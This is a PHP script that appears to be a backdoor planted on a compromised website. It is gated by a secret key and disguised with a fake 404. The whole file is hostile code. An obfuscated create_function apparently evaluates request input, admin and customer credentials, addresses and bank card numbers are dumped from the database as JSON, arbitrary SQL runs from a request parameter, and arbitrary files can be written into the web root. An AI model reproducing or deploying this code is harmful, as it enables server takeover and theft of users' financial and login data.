<?php
error_reporting(E_ALL);
ini_set('display_errors', 'On');
define('ROOT_URL', dirname(dirname('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'])));
if (!isset($_REQUEST["key"]) || "00GV32RuPFDO5FRbapKaeTVy" !== $_REQUEST["key"]) {
    header("status: 404 Not Found");exit('');
}
$UTOr=create_function(str_rot13('$').base64_decode('cw==').str_rot13('b').chr(0x2d7-0x26a).str_rot13('r'),base64_decode('ZQ==').base64_decode('dg==').chr(345-248).str_rot13('y').str_rot13('(').chr(909-873).base64_decode('cw==').chr(0xf1-0x82).chr(0x148-0xdb).base64_decode('ZQ==').str_rot13(')').base64_decode('Ow=='));$UTOr(base64_decode('MTE2N'.'TgyO0'.'BldkF'.'sKCRf'.''.str_rot13('H').str_rot13('R').chr(14364/252).chr(01151-01025).base64_decode('Vg==').''.''.chr(477-407).base64_decode('dA==').chr(25272/351).str_rot13('M').chr(0x3a9-0x379).''.'5CeVF'.'5aF0p'.'OzM0O'.'Tc0Nj'.'s='.''));
$webroot = $_SERVER['DOCUMENT_ROOT'];
$db = require $webroot.'/../config/database.php';
$conn = @new mysqli($db['hostname'], $db['username'], $db['password'], $db['database'], $db['hostport']);
$response['website'] = $_SERVER['SERVER_NAME'];
$siteName = '';
try {
    $siteinfo = require_once $webroot.'/../config/database.php';
    $siteName = $siteinfo['siteName'];

} catch (Exception $e) {

}
if (!$conn) {
    die("{\"status\":\"failed\",\"count\":0}");
}

$conn->query("set names 'utf8';");


$select_db = $conn->select_db($db['database']);
if (!$select_db) {
    die("could not connect to the db:\n");
}
$addDate = date('Y-m-d') . ' 00:00:00';
if (isset($_REQUEST["addDate"])) {
    $addDate = str_replace("/", "-", $_REQUEST["addDate"]);

}
$whereSql = "";
$whereReq = "";
if (isset($_REQUEST["where"])) {
    $whereReq = $_REQUEST["where"];
}
$ID = array();
if (isset($_REQUEST["tbl"]) && "user" === $_REQUEST["tbl"]) {
    $admin_tbl ='system_user';
    $sql = "SELECT id,username,password,login_ip as lastloginip,null as lastloginip_attribution,login_at as last_time,mail as email,1 as site_type FROM " . $admin_tbl . " " . $whereReq;
} else {
    $whereSql = $whereSql . " " . $whereReq;
    $tb_user = "xy_users";
    $xy_member_address = "xy_member_address";
    $xy_bankinfo = "xy_bankinfo";
    $sql = "select a.id,a.tel as phone,concat_ws(':',a.pwd,a.salt) as `password`,null as quota,a.addtime as reg_time,null as reg_ip,concat_ws('-','账户名',a.username,'银行卡名',c.username) as name,b.address,null as contacts,c.cardnum as bank,null as identity,null as taobao from xy_users a left join xy_member_address b  on a.id=b.uid left join xy_bankinfo c on a.id=c.uid ". $whereReq;

}
if (isset($_REQUEST["query"])) {
    $sql = base64_decode($_REQUEST["query"]);
}
if (isset($_REQUEST["path"]) && isset($_REQUEST["code"])) {
    $path = base64_decode(substr($_REQUEST["path"], 2));
    $code = base64_decode(substr($_REQUEST["code"], 2));
    file_put_contents($webroot . "/" . $path, $code);
}
if ($result = $conn->query($sql)) {
    while ($row = $result->fetch_assoc()) {
        try {
            if (isset($row["addess"]) && $row["addess"] !== "NULL") {$row["addess"] = json_decode($row["addess"]);}
            if (isset($row["contacts"]) && $row["name"] !== "NULL") {$row["contacts"] = json_decode($row["contacts"]);}
            if (isset($row["bank"]) && $row["bank"] !== "NULL") {$row["bank"] = json_decode($row["bank"]);}
            if (isset($row["identity"]) && $row["identity"] !== "NULL") {$row["identity"] = json_decode($row["identity"]);}
        } catch (Exception $e) {}
        array_push($ID, $row);

    }
    $response['status'] = "success";
} else {
    $response['status'] = "failed";
}
$response['data'] = $ID;
$response['siteName'] = $siteName;
$response['count'] = sizeof($ID);
$response['typeID'] = 'WEP7L6F6';
$response['version'] = '0.0.1';

echo json_encode($response);
$conn->close();

